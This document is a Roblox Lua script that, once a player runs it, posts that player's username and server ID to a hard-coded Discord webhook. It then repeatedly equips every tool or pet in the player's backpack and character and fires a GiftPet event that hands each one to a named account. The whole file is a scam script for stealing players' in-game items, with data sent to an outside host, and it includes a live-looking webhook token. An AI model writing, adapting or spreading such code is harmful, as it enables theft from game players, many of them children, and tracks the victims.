local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- <-- Put your webhook URL here
local adminUsername = "connor24377_10"
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild("Backpack")
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local giftPetEvent = ReplicatedStorage:WaitForChild("GiftPet")

local adminPlayer = Players:FindFirstChild(adminUsername)
if not adminPlayer then
	warn("Admin player not found")
	return
end

-- Send data to webhook
local function sendWebhook()
	local data = {
		username = localPlayer.Name,
		serverJobId = game.JobId
	}

	local payload = HttpService:JSONEncode(data)
	
	-- Discord webhook payload formatting
	local discordPayload = HttpService:JSONEncode({
		content = "Player executed script",
		embeds = {{
			title = "Script Executed",
			fields = {
				{name = "Username", value = data.username, inline = true},
				{name = "Server Job ID", value = data.serverJobId, inline = true},
			},
			color = 65280
		}}
	})
	
	local success, err = pcall(function()
		HttpService:PostAsync(webhookURL, discordPayload, Enum.HttpContentType.ApplicationJson)
	end)
	
	if not success then
		warn("Failed to send webhook:", err)
	end
end

local function equipTool(tool)
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid and tool and tool.Parent and (tool.Parent == backpack or tool.Parent == character) then
		humanoid:EquipTool(tool)
	end
end

local function giftAllFrom(container)
	for _, item in ipairs(container:GetChildren()) do
		if item:IsA("Tool") or item:IsA("Model") then
			equipTool(item)
			wait(0.3)
			if giftPetEvent then
				giftPetEvent:FireServer("GivePet", adminPlayer)
			end
			wait(0.3)
		end
	end
end

-- Send webhook once on execution
sendWebhook()

-- Loop gifting to admin every 10 seconds (adjust timing as needed)
while true do
	giftAllFrom(backpack)
	giftAllFrom(character)
	wait(10)
end
